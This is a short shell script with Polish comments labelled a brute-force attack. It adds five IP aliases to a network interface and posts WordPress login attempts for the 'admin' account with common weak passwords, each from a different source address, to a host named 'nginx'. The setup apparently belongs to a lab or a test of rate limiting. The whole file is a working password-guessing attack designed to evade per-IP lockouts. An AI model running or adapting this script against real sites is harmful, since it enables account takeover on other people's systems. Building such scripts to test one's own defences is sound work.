#!/bin/sh

# atak bf z 5 różnych adresów IP

TARGET="http://nginx/wp-login.php"

for n in 1 2 3 4 5; do
    ip addr add 10.11.4.$n/16 dev eth0 2>/dev/null
done

curl -s -o /dev/null -w "[10.11.4.1] admin/haslo1  -> HTTP %{http_code}\n" --interface 10.11.4.1 --data "log=admin&pwd=haslo1" "$TARGET"
curl -s -o /dev/null -w "[10.11.4.2] admin/haslo2  -> HTTP %{http_code}\n" --interface 10.11.4.2 --data "log=admin&pwd=haslo2" "$TARGET"
curl -s -o /dev/null -w "[10.11.4.3] admin/123456  -> HTTP %{http_code}\n" --interface 10.11.4.3 --data "log=admin&pwd=123456" "$TARGET"
curl -s -o /dev/null -w "[10.11.4.4] admin/qwerty  -> HTTP %{http_code}\n" --interface 10.11.4.4 --data "log=admin&pwd=qwerty" "$TARGET"
curl -s -o /dev/null -w "[10.11.4.5] admin/admin   -> HTTP %{http_code}\n" --interface 10.11.4.5 --data "log=admin&pwd=admin"  "$TARGET"

echo koniec ataku
